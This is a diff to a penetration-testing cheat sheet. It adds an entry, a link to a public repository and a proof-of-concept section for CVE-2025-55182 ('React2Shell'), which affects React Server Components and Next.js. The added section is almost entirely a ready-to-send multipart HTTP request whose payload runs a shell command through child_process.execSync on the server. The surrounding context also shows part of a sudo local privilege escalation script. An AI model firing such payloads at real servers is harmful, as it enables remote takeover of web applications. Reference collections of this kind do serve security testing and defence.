@@ -180,6 +180,7 @@ Thank you for reading.
    		- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
    		- [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
    		- [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
+   		- [CVE-2025-55182: React2Shell RCE](#cve-2025-55182-react2shell-rce)
   		- [BadSuccessor Delegated Managed Service Account (dMSA) LPE](#badsuccessor-delegated-managed-service-account-dmsa-lpe)
   		- [GodPotato LPE](#godpotato-lpe)
 		- [Juicy Potato LPE](#juicy-potato-lpe)
@@ -455,6 +456,7 @@ Thank you for reading.
 | CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
 | CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
 | CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
+| CVE-2025-55182 | React2Shell RCE | https://github.com/msanft/CVE-2025-55182 |
 | CVE-2025-62215 | Windows Kernel LPE | https://github.com/dexterm300/CVE-2025-62215-exploit-poc |
 | CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
 | n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
@@ -8976,6 +8978,53 @@ gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
 echo "woot!"
 sudo -R woot woot
 rm -rf ${STAGE?}
+```
+
+#### CVE-2025-55182: React2Shell RCE
+
+##### Prerequisistes
+
+- React 19.0.0, 19.1.0, 19.1.1, and 19.2.0
+- Next.js versions ≥14.3.0-canary.77, all 15.x, and 16.x releases prior to patching
+- Other frameworks using RSC: React Router (RSC mode), Waku, Redwood SDK, and various RSC plugins
+
+##### Proof of Concept (PoC)
+
+```shell
+POST / HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+Next-Action: x
+X-Nextjs-Request-Id: b5dce965
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
+Content-Length: 740
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "reason": -1,
+  "value": "{\"then\":\"$B1337\"}",
+  "_response": {
+    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
+    "_chunks": "$Q2",
+    "_formData": {
+      "get": "$1:constructor:constructor"
+    }
+  }
+}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
 #### BadSuccessor Delegated Managed Service Account (dMSA) LPE
